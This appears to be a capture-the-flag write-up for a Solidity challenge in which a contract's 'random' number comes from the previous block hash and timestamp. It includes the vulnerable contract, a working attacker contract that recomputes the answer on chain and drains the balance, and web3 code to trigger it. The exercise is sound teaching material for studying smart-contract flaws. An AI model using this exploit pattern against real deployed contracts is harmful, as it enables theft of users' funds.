# 06. Guess the new number

The number is now generated on-demand when a guess is made.

## Target contract

```solidity
pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

## Vulnerability

The important thing to note here is that even though the answer is computed when a guess is made, it's not random. `uint8(keccak256(block.blockhash(block.number - 1), now));` will return the same value for every transaction belonging to the same block. So we need to make the computation on chain for that value and send it to `guess` which will compute exactly the same result and pass the challenge.

The syntax is adapted for solidity > 0.8.0 but has the exact same effect.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma abicoder v1;

interface IChallenge {
    function guess(uint8) external payable;
    function isComplete() external view returns (bool);
}

contract Attacker {

    address owner;
    IChallenge targetContract;

    constructor(IChallenge _targetContract) {
        targetContract = _targetContract;
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value == 1 ether, "send 1 ETH");
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        targetContract.guess{value: msg.value}(answer);
        require(targetContract.isComplete(), "Wrong answer");
        msg.sender.call{value: address(this).balance}("");
    }

    receive() external payable {}
}
```

You can deploy this contract on Remix for example and simply call `attack` with 1 ETH. Alternatively, you could do that from nodejs :

```js
// Set this variable to the address of the contract you just deployed
const contract = "0xA357a9c002f4772DfeE6B169e84F0Cfd59FC1DBE";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "attack",
    type: "function",
    inputs: [],
  },
  []
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: contract,
  data: data,
  value: web3.utils.toWei("1", "ether"),
});
```

You can now submit the challenge !